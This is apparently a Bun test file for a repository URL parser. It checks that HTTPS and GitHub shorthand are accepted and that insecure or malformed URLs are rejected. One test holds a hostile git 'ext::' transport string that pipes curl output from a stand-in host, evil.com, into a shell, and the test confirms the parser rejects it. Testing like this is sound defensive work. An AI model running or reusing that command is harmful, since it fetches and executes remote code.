import { describe, test, expect } from "bun:test";
import { parseRepositoryUrl } from "../src/utils/git";

describe("parseRepositoryUrl", () => {
	test("should parse GitHub shorthand", () => {
		const result = parseRepositoryUrl("facebook/react");
		expect(result.url).toBe("https://github.com/facebook/react.git");
		expect(result.name).toBe("react");
	});

	test("should parse HTTPS URLs", () => {
		const result = parseRepositoryUrl("https://github.com/facebook/react.git");
		expect(result.url).toBe("https://github.com/facebook/react.git");
		expect(result.name).toBe("react");
	});

	test("should reject HTTP URLs", () => {
		expect(() => parseRepositoryUrl("http://github.com/facebook/react.git")).toThrow(
			"Only HTTPS"
		);
	});

	test("should reject git:// URLs", () => {
		expect(() => parseRepositoryUrl("git://github.com/facebook/react.git")).toThrow();
	});

	test("should reject ssh URLs", () => {
		expect(() => parseRepositoryUrl("git@github.com:facebook/react.git")).toThrow();
	});

	test("should reject malicious git URLs", () => {
		expect(() => parseRepositoryUrl("ext::sh -c curl% evil.com|sh")).toThrow();
	});

	test("should validate GitHub shorthand format", () => {
		expect(() => parseRepositoryUrl("invalid-shorthand")).toThrow();
		expect(() => parseRepositoryUrl("facebook/react/extra")).toThrow();
	});

	test("should handle URLs with various valid characters", () => {
		const result = parseRepositoryUrl("my-org/my-repo.js");
		expect(result.url).toBe("https://github.com/my-org/my-repo.js.git");
		expect(result.name).toBe("my-repo.js");
	});
});
